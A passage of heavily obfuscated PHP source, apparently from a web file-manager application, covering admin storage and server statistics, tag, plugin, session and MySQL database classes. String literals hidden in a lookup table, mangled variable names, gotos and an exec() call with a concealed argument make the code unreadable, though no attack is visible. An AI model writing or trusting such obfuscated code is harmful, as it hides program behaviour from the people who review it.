$Ø†¬æÀŒ =& $_SERVER[Á≈ ä ∞]; $Êîÿö»ê = $this->sourceSize(); $ó‹ÜÒ Ã = $Êîÿö»ê[$Ø†¬æÀŒ[86]]; $¥¨ ñï¨ = $Êîÿö»ê[$Ø†¬æÀŒ[1764]]; $ß¿ÓÈ ‹ = Model($Ø†¬æÀŒ[832])->where(array($Ø†¬æÀŒ[419] => 0))->count($Ø†¬æÀŒ[411]); $◊¶¿›Ï∫ = array($Ø†¬æÀŒ[419] => 0, $Ø†¬æÀŒ[210] => array($Ø†¬æÀŒ[1017], strtotime(date($Ø†¬æÀŒ[1771])))); $“í˜≥®Ô = Model($Ø†¬æÀŒ[832])->where($◊¶¿›Ï∫)->sum($Ø†¬æÀŒ[86]); $ »Í‚¬¥ = Model($Ø†¬æÀŒ[832])->where($◊¶¿›Ï∫)->count($Ø†¬æÀŒ[411]); return array($Ø†¬æÀŒ[770] => $ó‹ÜÒ Ã, $Ø†¬æÀŒ[1764] => $¥¨ ñï¨, $Ø†¬æÀŒ[1796] => $ó‹ÜÒ Ã - $¥¨ ñï¨, $Ø†¬æÀŒ[1797] => (int) $“í˜≥®Ô, $Ø†¬æÀŒ[772] => (int) $ß¿ÓÈ ‹, $Ø†¬æÀŒ[1798] => (int) $ »Í‚¬¥); } private function optionAccess() { $€¥Ó≤ê° =& $_SERVER[Á≈ ä ∞]; return array($€¥Ó≤ê°[766] => $this->typeLogCnt(), $€¥Ó≤ê°[117] => $this->typeLogCnt($€¥Ó≤ê°[117]), $€¥Ó≤ê°[461] => $this->typeLogCnt($€¥Ó≤ê°[461]), $€¥Ó≤ê°[1799] => $this->typeLogCnt($€¥Ó≤ê°[1799]), $€¥Ó≤ê°[1800] => $this->typeLogCnt($€¥Ó≤ê°[1800]), $€¥Ó≤ê°[609] => $this->typeLogCnt($€¥Ó≤ê°[22], $€¥Ó≤ê°[1775])); } private function typeLogCnt($¯˘¢¿≥è = '', $«óçÿÈ— = "\151\x64") { $≤˘ß‚Ç› =& $_SERVER[Á≈ ä ∞]; $›µçõ◊˚ = array($≤˘ß‚Ç›[117] => array($≤˘ß‚Ç›[1801], $≤˘ß‚Ç›[1802]), $≤˘ß‚Ç›[461] => array($≤˘ß‚Ç›[1803], $≤˘ß‚Ç›[1804]), $≤˘ß‚Ç›[1799] => array($≤˘ß‚Ç›[1805], $≤˘ß‚Ç›[1806], $≤˘ß‚Ç›[1807]), $≤˘ß‚Ç›[1800] => array($≤˘ß‚Ç›[1808], $≤˘ß‚Ç›[1809]), $≤˘ß‚Ç›[1810] => array($≤˘ß‚Ç›[1811], $≤˘ß‚Ç›[1812], $≤˘ß‚Ç›[1813])); $ö‚Ö˜ÂÄ = strtotime(date($≤˘ß‚Ç›[1771])); $Éô˙Ö·≥ = array($≤˘ß‚Ç›[210] => array($≤˘ß‚Ç›[1017], $ö‚Ö˜ÂÄ)); if ($¯˘¢¿≥è) { $Éô˙Ö·≥[$≤˘ß‚Ç›[43]] = array($≤˘ß‚Ç›[17], $›µçõ◊˚[$¯˘¢¿≥è]); } $ûŸÅ”Õ– = Model($≤˘ß‚Ç›[1774])->where($Éô˙Ö·≥)->count($«óçÿÈ—); return (int) $ûŸÅ”Õ–; } private function optionServer() { $‹æı∞≠ﬂ =& $_SERVER[Á≈ ä ∞]; $⁄æü™ΩÔ = $this->diskDriver(); $Ù≤Î‰ÊÖ = KodIO::defaultDriver(); $Ù˘€”„ø = array($‹æı∞≠ﬂ[824] => $Ù≤Î‰ÊÖ[$‹æı∞≠ﬂ[408]]); $è∆∫íóõ = Model($‹æı∞≠ﬂ[480])->where($Ù˘€”„ø)->sum($‹æı∞≠ﬂ[86]); $Æ≥≠Å ˆ = explode($‹æı∞≠ﬂ[63], $_SERVER[$‹æı∞≠ﬂ[153]]); $≤ “›≠± = $Æ≥≠Å ˆ[0]; $√…¢âÃ∂ = $GLOBALS[$‹æı∞≠ﬂ[16]][$‹æı∞≠ﬂ[31]]; $˝ñ∆˜êõ = $√…¢âÃ∂[$‹æı∞≠ﬂ[979]]; if ($˝ñ∆˜êõ == $‹æı∞≠ﬂ[967]) { $ﬂΩùúØú = explode($‹æı∞≠ﬂ[1275], $√…¢âÃ∂[$‹æı∞≠ﬂ[978]]); $˝ñ∆˜êõ = $ﬂΩùúØú[0]; } if ($˝ñ∆˜êõ == $‹æı∞≠ﬂ[915] || $˝ñ∆˜êõ == $‹æı∞≠ﬂ[811]) { $ä«ÛÍ≈Ì = Model()->db()->query($‹æı∞≠ﬂ[1814]); $∑£ÁòîÊ = $ä«ÛÍ≈Ì[0] && isset($ä«ÛÍ≈Ì[0][$‹æı∞≠ﬂ[1556]]) ? $ä«ÛÍ≈Ì[0][$‹æı∞≠ﬂ[1556]] : 0; $˝ñ∆˜êõ = $‹æı∞≠ﬂ[1815] . ($∑£ÁòîÊ ? $‹æı∞≠ﬂ[18] . $∑£ÁòîÊ : $‹æı∞≠ﬂ[22]); } $¡≈öïÊÀ = $GLOBALS[$‹æı∞≠ﬂ[16]][$‹æı∞≠ﬂ[358]][$‹æı∞≠ﬂ[834]]; return array($‹æı∞≠ﬂ[1816] => $⁄æü™ΩÔ ? $⁄æü™ΩÔ[$‹æı∞≠ﬂ[1817]] : 0, $‹æı∞≠ﬂ[1818] => $⁄æü™ΩÔ ? $⁄æü™ΩÔ[$‹æı∞≠ﬂ[1819]] : 0, $‹æı∞≠ﬂ[1820] => (int) $Ù≤Î‰ÊÖ[$‹æı∞≠ﬂ[1817]] * 1024 * 1024 * 1024, $‹æı∞≠ﬂ[1821] => (int) $è∆∫íóõ, $‹æı∞≠ﬂ[1822] => ucfirst($≤ “›≠±), $‹æı∞≠ﬂ[1823] => $‹æı∞≠ﬂ[1824] . PHP_VERSION, $‹æı∞≠ﬂ[1825] => phpBuild64() ? 64 : 32, $‹æı∞≠ﬂ[765] => str_replace($‹æı∞≠ﬂ[1133], $‹æı∞≠ﬂ[995], $˝ñ∆˜êõ), $‹æı∞≠ﬂ[358] => ucfirst($¡≈öïÊÀ), $‹æı∞≠ﬂ[42] => $_SERVER[$‹æı∞≠ﬂ[1826]]); } private function diskDriver() { $¨‰óÉ˙π =& $_SERVER[Á≈ ä ∞]; $”ÄÔ°ÄØ = $¨‰óÉ˙π[18]; $·êÿ¢âå = $GLOBALS[$¨‰óÉ˙π[16]][$¨‰óÉ˙π[1291]] == $¨‰óÉ˙π[1292]; if ($·êÿ¢âå) { $”ÄÔ°ÄØ = $¨‰óÉ˙π[1827]; if (function_exists($¨‰óÉ˙π[1828])) { exec($¨‰óÉ˙π[1829], $ÕóõÍÈ˝); $”ÄÔ°ÄØ = $ÕóõÍÈ˝[1] . $¨‰óÉ˙π[18]; } } if (!file_exists($”ÄÔ°ÄØ)) { return; } $é‡”¿∂ì = @disk_total_space($”ÄÔ°ÄØ); $ìì€˛íô = $é‡”¿∂ì - @disk_free_space($”ÄÔ°ÄØ); return array($¨‰óÉ˙π[1817] => $é‡”¿∂ì, $¨‰óÉ˙π[1819] => $ìì€˛íô); } public function fileChart($Æ®÷≈Òª) { $µäÌ◊Âï =& $_SERVER[Á≈ ä ∞]; if (isset($Æ®÷≈Òª[$µäÌ◊Âï[1658]])) { return Model($µäÌ◊Âï[832])->userFileTypeProfile($Æ®÷≈Òª[$µäÌ◊Âï[1658]]); } if (isset($Æ®÷≈Òª[$µäÌ◊Âï[1830]])) { return Model($µäÌ◊Âï[832])->groupFileTypeProfile($Æ®÷≈Òª[$µäÌ◊Âï[1830]]); } $ïöÜ∂‚Ω = $this->sourceSize(); $î¨çø—ã = array($µäÌ◊Âï[441] => 0, $µäÌ◊Âï[420] => 1); $Ù‘á§“ã = Model($µäÌ◊Âï[832])->where($î¨çø—ã)->sum($µäÌ◊Âï[86]); $î¨çø—ã[$µäÌ◊Âï[420]] = 2; $ıÏÊ≤Ω∑ = Model($µäÌ◊Âï[832])->where($î¨çø—ã)->sum($µäÌ◊Âï[86]); return array($µäÌ◊Âï[770] => $ïöÜ∂‚Ω[$µäÌ◊Âï[86]], $µäÌ◊Âï[1764] => $ïöÜ∂‚Ω[$µäÌ◊Âï[1764]], $µäÌ◊Âï[1765] => (int) $Ù‘á§“ã, $µäÌ◊Âï[1766] => (int) $ıÏÊ≤Ω∑); } private function sourceSize() { $¶–ﬂ∆ÛÁ =& $_SERVER[Á≈ ä ∞]; $Ã…®Çùì = Model($¶–ﬂ∆ÛÁ[832])->where(array($¶–ﬂ∆ÛÁ[419] => 0))->sum($¶–ﬂ∆ÛÁ[86]); $©’ç¯áä = Model($¶–ﬂ∆ÛÁ[480])->sum($¶–ﬂ∆ÛÁ[86]); if ($©’ç¯áä > $Ã…®Çùì) { $©’ç¯áä = $Ã…®Çùì; } return array($¶–ﬂ∆ÛÁ[86] => (int) $Ã…®Çùì, $¶–ﬂ∆ÛÁ[1764] => (int) $©’ç¯áä); } } goto BÚÊ˜¥§Ï∂; Cò°Öá¬√í: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($ÕπâÙµ‰) { $ë™â’“Ÿ =& $_SERVER[Á≈ ä ∞]; return array($ë™â’“Ÿ[1939] => array($ÕπâÙµ‰[0], $ë™â’“Ÿ[1940]), $ë™â’“Ÿ[1941] => array($ÕπâÙµ‰[0], $ë™â’“Ÿ[1942])); } protected function get($¨≈¸Í≠∞) { $Î»Øêﬂ˘ =& $_SERVER[Á≈ ä ∞]; $í∞»Ïôî = Model($Î»Øêﬂ˘[531])->metaGet($¨≈¸Í≠∞, $Î»Øêﬂ˘[1943]); $ù»˚â»ß = json_decode($í∞»Ïôî, !0); return $ù»˚â»ß ? $ù»˚â»ß : array($Î»Øêﬂ˘[1944] => $Î»Øêﬂ˘[98], $Î»Øêﬂ˘[378] => array()); } protected function set($¬æ∆ƒ≈å, $–¬⁄Íäö) { $ªÈ»ﬂÌ¶ =& $_SERVER[Á≈ ä ∞]; $–¬⁄Íäö = $–¬⁄Íäö ? $–¬⁄Íäö : array($ªÈ»ﬂÌ¶[1944] => $ªÈ»ﬂÌ¶[98], $ªÈ»ﬂÌ¶[378] => array()); return Model($ªÈ»ﬂÌ¶[531])->metaSet($¬æ∆ƒ≈å, $ªÈ»ﬂÌ¶[1943], json_encode($–¬⁄Íäö)); } protected function getByTagID($”¢ËπóÏ, $ïÊååô≥) { $Í‹öπå´ =& $_SERVER[Á≈ ä ∞]; if (!$”¢ËπóÏ || !$ïÊååô≥) { return !1; } if (!Model($Í‹öπå´[531])->getInfoSimple($”¢ËπóÏ)) { return !1; } $ÛÖÇõÚú = $this->get($”¢ËπóÏ); if (!$ÛÖÇõÚú || !isset($ÛÖÇõÚú[$Í‹öπå´[378]])) { return !1; } $ñ˝Ï˝ã∏ = array_find_by_field($ÛÖÇõÚú[$Í‹öπå´[378]], $Í‹öπå´[408], $ïÊååô≥); return is_array($ñ˝Ï˝ã∏) ? $ñ˝Ï˝ã∏ : !1; } public function listSource($ØÚÇ¨ç÷, $œ„ãÒΩ˜) { $≠††Ò”Å =& $_SERVER[Á≈ ä ∞]; if ($œ„ãÒΩ˜ && !is_array($œ„ãÒΩ˜)) { $œ„ãÒΩ˜ = array($œ„ãÒΩ˜); } $–ßπÎæ˛ = $this->listData($ØÚÇ¨ç÷); $µã§ÛŒç = array(); foreach ($–ßπÎæ˛ as $©˚õüˆ¿) { $¿ Ç∫Ìœ = $©˚õüˆ¿[$≠††Ò”Å[94]]; if (!$¿ Ç∫Ìœ) { continue; } if (!isset($µã§ÛŒç[$¿ Ç∫Ìœ])) { $µã§ÛŒç[$¿ Ç∫Ìœ] = array(); } $µã§ÛŒç[$¿ Ç∫Ìœ][] = $©˚õüˆ¿[$≠††Ò”Å[435]]; } $ﬂ±ë˚©‹ = array(); foreach ($µã§ÛŒç as $§ÒÆÕ¶ => $â§≠–•◊) { $ÃˆÊ√®Ø = !0; if (!$œ„ãÒΩ˜) { $ﬂ±ë˚©‹[] = $§ÒÆÕ¶; continue; } foreach ($œ„ãÒΩ˜ as $÷¯ôôôµ) { if (!in_array($÷¯ôôôµ, $â§≠–•◊)) { $ÃˆÊ√®Ø = !1; break; } } if ($ÃˆÊ√®Ø) { $ﬂ±ë˚©‹[] = $§ÒÆÕ¶; } } if (!$ﬂ±ë˚©‹) { return array(); } $È‚„ßØÀ = array($≠††Ò”Å[426] => array($≠††Ò”Å[427], $ﬂ±ë˚©‹), $≠††Ò”Å[514] => $ØÚÇ¨ç÷, $≠††Ò”Å[420] => SourceModel::TYPE_GROUP); $òºê≠©¢ = Model($≠††Ò”Å[1330])->listSource($È‚„ßØÀ); if (!$òºê≠©¢ || count($ﬂ±ë˚©‹) == $òºê≠©¢[$≠††Ò”Å[375]][$≠††Ò”Å[376]]) { return $òºê≠©¢; } $Ωù∑É”Ÿ = array(); $ﬂê£ˆ“ï = array_to_keyvalue($òºê≠©¢[$≠††Ò”Å[92]], $≠††Ò”Å[22], $≠††Ò”Å[411]); $‰˛ßü•è = array_to_keyvalue($òºê≠©¢[$≠††Ò”Å[93]], $≠††Ò”Å[22], $≠††Ò”Å[411]); $ßã√‚∫˝ = array_merge($‰˛ßü•è, $ﬂê£ˆ“ï); foreach ($ﬂ±ë˚©‹ as $¿ Ç∫Ìœ) { if (!in_array($¿ Ç∫Ìœ, $ßã√‚∫˝)) { $Ωù∑É”Ÿ[] = $¿ Ç∫Ìœ; } } if ($Ωù∑É”Ÿ) { $this->removeBySource($ØÚÇ¨ç÷, $Ωù∑É”Ÿ); } return $òºê≠©¢; } protected function listData($Ì°í¨¨“) { $ªÄ≠ùºò =& $_SERVER[Á≈ ä ∞]; $Ÿ‰Ÿƒ´Ü = array($ªÄ≠ùºò[1649] => 0, $ªÄ≠ùºò[493] => array($ªÄ≠ùºò[1945], 0), $ªÄ≠ùºò[431] => $ªÄ≠ùºò[1946] . $Ì°í¨¨“); $É™ÁÔ≠ = $ªÄ≠ùºò[1947]; $∫òƒ∆Ÿ„ = $this->field($É™ÁÔ≠)->where($Ÿ‰Ÿƒ´Ü)->order($ªÄ≠ùºò[1948])->select(); return $∫òƒ∆Ÿ„ ? $∫òƒ∆Ÿ„ : array(); } protected function addToTag($Ñ…‰Ú˘ñ, $˜®ëÛ„», $◊òáÅä¥) { $˝‰õŸ∞˘ =& $_SERVER[Á≈ ä ∞]; if (!$this->getByTagID($Ñ…‰Ú˘ñ, $◊òáÅä¥) || !$˜®ëÛ„») { return !1; } if (!Model($˝‰õŸ∞˘[832])->pathInfo($˜®ëÛ„»)) { return !1; } $îÃéÊåÏ = array($˝‰õŸ∞˘[1649] => 0, $˝‰õŸ∞˘[493] => $◊òáÅä¥, $˝‰õŸ∞˘[430] => $˜®ëÛ„», $˝‰õŸ∞˘[431] => $˝‰õŸ∞˘[1949] . $Ñ…‰Ú˘ñ, $˝‰õŸ∞˘[429] => $˝‰õŸ∞˘[22], $˝‰õŸ∞˘[1834] => 0); if ($this->where($îÃéÊåÏ)->find()) { return !1; } return $this->add($îÃéÊåÏ); } protected function removeFromTag($Â…Î›—Æ, $Éô£≤”ü, $≠ÀÉÒîÙ) { $˝Öß˝≤± =& $_SERVER[Á≈ ä ∞]; if (!$this->getByTagID($Â…Î›—Æ, $≠ÀÉÒîÙ) || !$Éô£≤”ü) { return !1; } if (is_array($Éô£≤”ü)) { $Éô£≤”ü = array($˝Öß˝≤±[17], $Éô£≤”ü); } $πÙè´€œ = array($˝Öß˝≤±[1649] => 0, $˝Öß˝≤±[493] => $≠ÀÉÒîÙ, $˝Öß˝≤±[431] => $˝Öß˝≤±[1949] . $Â…Î›—Æ, $˝Öß˝≤±[430] => $Éô£≤”ü); return $this->where($πÙè´€œ)->delete(); } protected function removeByTag($ç≠ ñÜº, $ äÀÑ‹Ö) { $£Æºôªï =& $_SERVER[Á≈ ä ∞]; if (!$this->getByTagID($ç≠ ñÜº, $ äÀÑ‹Ö)) { return !1; } $ÖÑ˙§≥Å = array($£Æºôªï[1649] => 0, $£Æºôªï[493] => $ äÀÑ‹Ö, $£Æºôªï[431] => $£Æºôªï[1949] . $ç≠ ñÜº); return $this->where($ÖÑ˙§≥Å)->delete(); } protected function removeBySource($ÛÓÅ»∆», $¯≤ÏﬁÕÕ) { $°÷ç¸îº =& $_SERVER[Á≈ ä ∞]; if (!$ÛÓÅ»∆» || !$¯≤ÏﬁÕÕ) { return !1; } if (is_array($¯≤ÏﬁÕÕ)) { $¯≤ÏﬁÕÕ = array($°÷ç¸îº[17], $¯≤ÏﬁÕÕ); } $“·¶ﬂ‹ = array($°÷ç¸îº[1649] => 0, $°÷ç¸îº[430] => $¯≤ÏﬁÕÕ, $°÷ç¸îº[493] => array($°÷ç¸îº[1017], 0), $°÷ç¸îº[431] => $°÷ç¸îº[1949] . $ÛÓÅ»∆»); return $this->where($“·¶ﬂ‹)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x70\x6c\x75\147\151\x6e\114\151\x73\164"; public $field = array("\x6e\141\155\x65", "\163\x74\141\164\165\x73", "\162\x65\147\x69\x65\163\x74", "\143\x6f\x6e\x66\x69\x67"); public function loadList($±ñ∏Êú˛ = false) { $‰©–ª¢ã = array_to_keyvalue($this->listData(), $_SERVER[Á≈ ä ∞][42]); if ($±ñ∏Êú˛) { return $‰©–ª¢ã[$±ñ∏Êú˛]; } return $‰©–ª¢ã; } public function init() { $ú†ç¯”â =& $_SERVER[Á≈ ä ∞]; Hook::trigger($ú†ç¯”â[1950]); $æó©Ö©ÿ = $this->loadPluginList(); foreach ($æó©Ö©ÿ as $ò≥ããﬁî => $ŸÇèÚ´ø) { $’é°‹ôÏ = $this->appAllow($ò≥ããﬁî, $ŸÇèÚ´ø); if (!$’é°‹ôÏ) { continue; } foreach ($ŸÇèÚ´ø[$ú†ç¯”â[1951]] as $¶õπÓò™ => $ù∆⁄”ô¬) { Hook::bind($¶õπÓò™, $ù∆⁄”ô¬); } } Hook::trigger($ú†ç¯”â[1952]); Hook::trigger(ACTION); } public function appAllow($˚∏üÜ«Ã, $··û‚˘”, $òä∏ø˙é = true) { $˝ü˘£„¨ =& $_SERVER[Á≈ ä ∞]; $‘◊ºóíØ = PLUGIN_DIR . $˚∏üÜ«Ã . $˝ü˘£„¨[1953]; if (!is_array($··û‚˘”) || !is_array($··û‚˘”[$˝ü˘£„¨[1951]]) || $··û‚˘”[$˝ü˘£„¨[757]] != 1 || !is_file($‘◊ºóíØ)) { return !1; } if ($GLOBALS[$˝ü˘£„¨[512]] == 1) { if ($GLOBALS[$˝ü˘£„¨[16]][$˝ü˘£„¨[1954]] || !$GLOBALS[$˝ü˘£„¨[16]][$˝ü˘£„¨[1955]]) { return !0; } $¢∞π¡õ = explode($˝ü˘£„¨[60], strtolower($GLOBALS[$˝ü˘£„¨[16]][$˝ü˘£„¨[1955]])); return in_array(strtolower($˚∏üÜ«Ã), $¢∞π¡õ) ? !1 : !0; } if ($òä∏ø˙é && !Action($˝ü˘£„¨[1956])->checkAuth($˚∏üÜ«Ã)) { return !1; } return !0; } public function unInstall($î“∆∆¿∑) { $Œ‚‹ÿ™ù =& $_SERVER[Á≈ ä ∞]; $∑èÂï≠å = $this->loadList($î“∆∆¿∑); if (file_exists(PLUGIN_DIR . $î“∆∆¿∑)) { Hook::apply($î“∆∆¿∑ . $Œ‚‹ÿ™ù[1957]); } $this->remove($∑èÂï≠å[$Œ‚‹ÿ™ù[408]]); } public function changeStatus($ÊèÂπî≠, $ÿ≥ö–äæ) { $˝«û∆óç =& $_SERVER[Á≈ ä ∞]; $≥∫∆»Î‰ = $this->loadList($ÊèÂπî≠); if ($ÿ≥ö–äæ) { Hook::apply($ÊèÂπî≠ . $˝«û∆óç[1958]); } $this->update($≥∫∆»Î‰[$˝«û∆óç[408]], array($˝«û∆óç[1959] => $ÿ≥ö–äæ)); } public function appRegist($Î±Ô÷ÙÙ, $Ì¸ç¿îô) { $«ﬁ∑ØŒ¿ =& $_SERVER[Á≈ ä ∞]; $Æäî¬·ì = $this->loadList($Î±Ô÷ÙÙ); if ($Æäî¬·ì) { $this->update($Æäî¬·ì[$«ﬁ∑ØŒ¿[408]], array($«ﬁ∑ØŒ¿[1951] => $Ì¸ç¿îô)); } else { $ŒÄ∑à≠¬ = array($«ﬁ∑ØŒ¿[42] => $Î±Ô÷ÙÙ, $«ﬁ∑ØŒ¿[1951] => $Ì¸ç¿îô, $«ﬁ∑ØŒ¿[757] => 0, $«ﬁ∑ØŒ¿[16] => $this->getConfigDefault($Î±Ô÷ÙÙ)); $this->insert($ŒÄ∑à≠¬); } } public function getConfigDefault($Ω”äÎ…Û) { $˛∏á»« =& $_SERVER[Á≈ ä ∞]; $ˆÑ˝§€‹ = array(); $∂Õ≠∞áÂ = $this->getPackageJson($Ω”äÎ…Û); if (!$∂Õ≠∞áÂ && is_array($∂Õ≠∞áÂ[$˛∏á»«[1960]])) { return $ˆÑ˝§€‹; } foreach ($∂Õ≠∞áÂ[$˛∏á»«[1960]] as $’Äó∫Òì => $üÑ‰»›Œ) { if (!isset($üÑ‰»›Œ[$˛∏á»«[383]]) || isset($ˆÑ˝§€‹[$’Äó∫Òì])) { continue; } $ˆÑ˝§€‹[$’Äó∫Òì] = $üÑ‰»›Œ[$˛∏á»«[383]]; } return $ˆÑ˝§€‹; } public function getPackageJson($ƒ˜ÄäÆ›) { return Hook::apply($ƒ˜ÄäÆ› . $_SERVER[Á≈ ä ∞][1961]); } public function getConfig($Ë‰‰ª°Å, $Ãõ‹ë¡… = false) { $ùîÕ˘¶ä =& $_SERVER[Á≈ ä ∞]; $ÇÃ¬ÛÓ™ = array(); $‡˛øÀ⁄¬ = $this->loadList($Ë‰‰ª°Å); if ($‡˛øÀ⁄¬ && is_array($‡˛øÀ⁄¬[$ùîÕ˘¶ä[16]])) { $ÇÃ¬ÛÓ™ = $‡˛øÀ⁄¬[$ùîÕ˘¶ä[16]]; } if (!$ÇÃ¬ÛÓ™ || $Ãõ‹ë¡…) { $ÇÃ¬ÛÓ™ = $this->getConfigDefault($Ë‰‰ª°Å); } return $ÇÃ¬ÛÓ™; } public function setConfig($ø∆˘¨üñ, $‚¨ñı¬± = false) { $ç¢π°Ç£ =& $_SERVER[Á≈ ä ∞]; $∆øúä˘ë = $this->loadList($ø∆˘¨üñ); if (!$∆øúä˘ë) { return !1; } $∫’ﬁ»÷º = $∆øúä˘ë[$ç¢π°Ç£[16]]; if ($‚¨ñı¬± == !1) { $∫’ﬁ»÷º = array(); $‚¨ñı¬± = $this->getConfigDefault($ø∆˘¨üñ); } foreach ($‚¨ñı¬± as $◊«âºÒ© => $ˆ§´äò) { $∫’ﬁ»÷º[$◊«âºÒ©] = is_string($ˆ§´äò) ? trim($ˆ§´äò) : $ˆ§´äò; } $this->update($∆øúä˘ë[$ç¢π°Ç£[408]], array($ç¢π°Ç£[16] => $∫’ﬁ»÷º)); } public function viewList() { $«Ñÿ≥´¢ =& $_SERVER[Á≈ ä ∞]; $˜Ê¨Äîò = $this->loadList(); $this->pluginScan($˜Ê¨Äîò); $˜Ê¨Äîò = $this->loadPluginList(); $ÓµÉåÇ” = array(); foreach ($˜Ê¨Äîò as $…Í˝…æ– => $ÑèÉ¬Áâ) { unset($ÑèÉ¬Áâ[$«Ñÿ≥´¢[1951]], $ÑèÉ¬Áâ[$«Ñÿ≥´¢[16]]); $ΩÚÉ…òÛ = PLUGIN_DIR . $ÑèÉ¬Áâ[$«Ñÿ≥´¢[42]] . $«Ñÿ≥´¢[1953]; if (!is_file($ΩÚÉ…òÛ)) { continue; } $Ωçµ¸ßì = Hook::apply($ÑèÉ¬Áâ[$«Ñÿ≥´¢[42]] . $«Ñÿ≥´¢[1961]); if (is_array($Ωçµ¸ßì)) { $ÓµÉåÇ”[$…Í˝…æ–] = array_merge($ÑèÉ¬Áâ, $Ωçµ¸ßì); } } return $ÓµÉåÇ”; } private function loadPluginList() { $¯Ï î©˛ =& $_SERVER[Á≈ ä ∞]; $äóÏäó˝ = $this->loadList(); if (strtolower(MOD) == $¯Ï î©˛[1962]) { return $äóÏäó˝; } $πÂ»«ÿ∫ = Hook::trigger($¯Ï î©˛[1963], $äóÏäó˝); if ($äóÏäó˝ && !$πÂ»«ÿ∫) { die; } return $πÂ»«ÿ∫ ? $πÂ»«ÿ∫ : $äóÏäó˝; } private function pluginScan($öï≥ˆ”Û) { $Ì“åÖ…ã =& $_SERVER[Á≈ ä ∞]; recursion_dir(PLUGIN_DIR, $¥ñ”ﬂ‡¶, $¡ŒÖ‘ıà, 0); foreach ($¥ñ”ﬂ‡¶ as $ô‰‡Á◊‚) { $°èóóéÏ = get_path_this($ô‰‡Á◊‚); if (isset($öï≥ˆ”Û[$°èóóéÏ]) || !file_exists($ô‰‡Á◊‚ . $Ì“åÖ…ã[1964]) || !file_exists($ô‰‡Á◊‚ . $Ì“åÖ…ã[1953])) { continue; } Hook::apply($°èóóéÏ . $Ì“åÖ…ã[1958]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\x65\x6d\137\163\145\163\163\151\x6f\156"; public function get($¸ÉÆè–ß) { $ØâÔ√è˘ =& $_SERVER[Á≈ ä ∞]; $Äﬂ´’€÷ = $this->where(array($ØâÔ√è˘[1965] => $¸ÉÆè–ß))->find(); if (!is_array($Äﬂ´’€÷)) { return !1; } return $Äﬂ´’€÷[$ØâÔ√è˘[762]]; } public function set($ı˚Ωÿ˙≈, $ìﬂø–øØ, $‰©¡®î« = 3600) { $µò»’“¢ =& $_SERVER[Á≈ ä ∞]; $ú˜ã’°÷ = array($µò»’“¢[1965] => $ı˚Ωÿ˙≈, $µò»’“¢[1869] => $ìﬂø–øØ, $µò»’“¢[1966] => $‰©¡®î« + time()); if (Session::get($µò»’“¢[1967])) { $ú˜ã’°÷[$µò»’“¢[1658]] = Session::get($µò»’“¢[1967]); } else { $ú˜ã’°÷[$µò»’“¢[1658]] = 0; } if ($this->get($ı˚Ωÿ˙≈)) { return $this->where(array($µò»’“¢[1965] => $ı˚Ωÿ˙≈))->save($ú˜ã’°÷); } else { return $this->add($ú˜ã’°÷, array(), !0); } } public function remove($ËÃ¡¯ì‰) { return $this->where(array($_SERVER[Á≈ ä ∞][1965] => $ËÃ¡¯ì‰))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Á≈ ä ∞][1968] . time())->delete(); } } goto aÙ≠‡õ”Æ¬; Bºöï†‰÷é: class DbMysqli extends Db { public function __construct($·˜’é‹ó = '') { $ß€§ó”ø =& $_SERVER[Á≈ ä ∞]; if (!extension_loaded($ß€§ó”ø[915])) { think_exception(think_lang($ß€§ó”ø[24]) . $ß€§ó”ø[916]); } if (!empty($·˜’é‹ó)) { $this->config = $·˜’é‹ó; if (empty($this->config[$ß€§ó”ø[27]])) { $this->config[$ß€§ó”ø[27]] = $ß€§ó”ø[22]; } } } public function connect($Ôîﬂ‘’∂ = '', $ã¿∑æå” = 0) { $∏◊ıÎπ∏ =& $_SERVER[Á≈ ä ∞]; if (!isset($this->linkID[$ã¿∑æå”])) { if (empty($Ôîﬂ‘’∂)) { $Ôîﬂ‘’∂ = $this->config; } $this->linkID[$ã¿∑æå”] = new mysqli($Ôîﬂ‘’∂[$∏◊ıÎπ∏[889]], $Ôîﬂ‘’∂[$∏◊ıÎπ∏[891]], $Ôîﬂ‘’∂[$∏◊ıÎπ∏[892]], $Ôîﬂ‘’∂[$∏◊ıÎπ∏[31]], $Ôîﬂ‘’∂[$∏◊ıÎπ∏[890]] ? intval($Ôîﬂ‘’∂[$∏◊ıÎπ∏[890]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $∑∑˜Ÿ∆° = $this->linkID[$ã¿∑æå”]->server_version; $this->linkID[$ã¿∑æå”]->query($∏◊ıÎπ∏[893] . think_config($∏◊ıÎπ∏[894]) . $∏◊ıÎπ∏[68]); if ($∑∑˜Ÿ∆° > $∏◊ıÎπ∏[895]) { $this->linkID[$ã¿∑æå”]->query($∏◊ıÎπ∏[896]); } $this->connected = !0; if (1 != think_config($∏◊ıÎπ∏[32])) { unset($this->config); } } return $this->linkID[$ã¿∑æå”]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Î«´Ú„¶) { $€¸‹≠á =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Î«´Ú„¶; if ($this->queryID) { $this->free(); } think_action_status($€¸‹≠á[33], 1); think_status($€¸‹≠á[34]); $this->queryID = $this->_linkID->query($Î«´Ú„¶); if ($this->_linkID->more_results()) { while (($ÿÁ¶°õâ = $this->_linkID->next_result()) != NULL) { $ÿÁ¶°õâ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ï±Ëé≈™) { $˝ì«û›≈ =& $_SERVER[Á≈ ä ∞]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ï±Ëé≈™; if ($this->queryID) { $this->free(); } think_action_status($˝ì«û›≈[35], 1); think_status($˝ì«û›≈[34]); $≤Úâ«‚™ = $this->_linkID->query($Ï±Ëé≈™); $this->debug(); if (!1 === $≤Úâ«‚™) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ú¸∞ÿÖﬁ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 